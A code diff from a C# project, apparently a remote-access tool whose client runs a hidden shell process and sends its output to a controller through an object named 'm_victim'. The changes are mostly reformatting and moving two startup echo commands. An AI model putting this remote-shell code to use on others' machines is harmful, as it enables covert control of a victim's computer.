@@ -45,15 +45,15 @@ namespace winClient48
             {
                 m_victim.fnSendCommand(new[]
                 {
-                "xterm",
-                "output",
-                Convert.ToBase64String(data)
-            });
+                    "xterm",
+                    "output",
+                    Convert.ToBase64String(data)
+                });
             };
         }
 
         /// <summary>
-        /// Start
+        /// Start xterm.
         /// </summary>
         /// <param name="cols"></param>
         /// <param name="rows"></param>
@@ -90,10 +90,13 @@ namespace winClient48
                 IsBackground = true
             };
             m_readThread.Start();
+
+            fnPushInput("echo Welcome to Xterm Shell\r\n");
+            fnPushInput("echo READY\r\n");
         }
 
         /// <summary>
-        /// Stop
+        /// Stop xterm.
         /// </summary>
         public void fnStop()
         {
@@ -171,9 +174,6 @@ namespace winClient48
 
                 m_hProcess = pi.hProcess;
                 m_hThread = pi.hThread;
-
-                fnPushInput($"echo Welcome to Xterm Shell\r\n");
-                fnPushInput("echo READY\r\n");
             }
             finally
             {
@@ -195,11 +195,12 @@ namespace winClient48
             while (m_isRunning)
             {
                 if (!WinAPI.ReadFile(
-                        m_hPipeOutRead,
-                        buffer,
-                        buffer.Length,
-                        out int read,
-                        IntPtr.Zero))
+                    m_hPipeOutRead,
+                    buffer,
+                    buffer.Length,
+                    out int read,
+                    IntPtr.Zero
+                ))
                     break;
 
                 if (read > 0)
